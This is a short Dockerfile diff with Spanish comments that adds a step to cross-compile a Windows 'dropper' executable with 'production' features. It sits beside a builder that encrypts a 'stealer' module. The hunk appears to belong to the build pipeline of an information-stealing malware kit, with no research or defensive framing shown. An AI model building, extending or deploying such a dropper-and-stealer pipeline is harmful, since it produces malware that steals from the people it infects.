@@ -78,6 +78,12 @@ RUN echo "🔨 Compilando builder..." && \
     chmod +x /build_output/builder && \
     echo "✅ Builder compilado: /build_output/builder"
 
+# 4b. Compilar el dropper (Windows) - con features de producción
+RUN echo "🔨 Compilando dropper..." && \
+    cargo build --release --target x86_64-pc-windows-gnu --package dropper --features production && \
+    cp target/x86_64-pc-windows-gnu/release/dropper.exe /build_output/dropper.exe && \
+    echo "✅ Dropper compilado: /build_output/dropper.exe"
+
 # 5. Encriptar módulos usando el builder
 RUN echo "🔐 Encriptando módulo stealer..." && \
     /build_output/builder encrypt-module --module stealer && \
